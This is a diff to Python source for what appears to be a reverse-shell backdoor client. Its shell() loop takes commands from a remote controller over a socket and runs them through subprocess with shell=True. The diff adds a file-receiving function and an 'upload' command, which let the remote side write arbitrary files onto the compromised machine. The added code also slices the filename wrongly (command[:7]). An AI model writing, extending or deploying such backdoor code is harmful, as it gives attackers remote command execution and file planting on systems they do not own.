@@ -20,6 +20,20 @@ def reliable_send(data):
     jsondata = json.dumps(data)
     s.send(jsondata.encode())
 
+
+def dowload_file(filename):
+    f = open(filename, 'wb')
+    s.settimeout(1)
+    chunk = s.recv(1024)
+    while chunk:
+        f.write(chunk)
+        try:
+            chunk = s.recv(1024)
+        except socket.timeout as e:
+            break
+    s.settimeout(None)
+    f.close()
+
 def shell():    
     while True:
         command = reliable_rcv()
@@ -33,6 +47,9 @@ def shell():
 
         elif command == "clear":
             pass
+
+        elif command[:6] == "upload":
+            dowload_file(command[:7])
 
         else:
             execute = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
